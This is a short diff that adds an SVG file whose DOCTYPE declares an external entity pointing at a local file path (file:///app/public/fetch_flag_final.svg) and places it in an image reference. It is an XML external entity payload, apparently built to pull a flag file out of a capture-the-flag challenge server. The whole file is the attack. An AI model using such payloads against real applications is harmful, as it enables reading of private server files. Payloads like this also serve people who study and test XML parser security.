@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY flag SYSTEM "file:///app/public/fetch_flag_final.svg">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400">
+  <image x="0" y="0" width="600" height="400" href="&flag;"/>
+</svg>
